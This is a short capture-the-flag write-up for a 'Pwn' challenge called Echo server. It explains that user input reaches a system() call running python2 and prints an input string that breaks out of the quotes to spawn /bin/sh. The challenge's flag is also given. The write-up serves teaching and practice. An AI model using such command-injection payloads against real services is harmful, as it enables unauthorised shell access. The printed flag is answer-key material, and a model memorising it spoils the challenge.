# Echo server

> > Pwn - 200pts
> 
> I have created a super-cool echo server - it can even do math! Pretty rad and secure, right!?
> 
> You can find the echo server at: `138.68.99.225:1337`
> 
> PS: connect using `nc <ip> <port>`
> 
> File: [system](./system)

## Writeup

After tracing or reverse engineering, we can see the user input is executed as such:

`system("python2 -c 'print <user input>'")`

This mean that we can get a reverse shell by prematurely terminating the python command and spawning a shell, but also terminating the final single quote:

`"kake"'; /bin/sh; echo 'torsk`

Yielding the shell command line:

`python2 -c 'print "kake"'; /bin/sh; echo 'torsk'`

This will present the user with a shell, and the flag can be read:

```
cat flag
UiTHack{user_input_into_system_is_dangerous}
```

Yielding the flag:

`UiTHack{user_input_into_system_is_dangerous}`
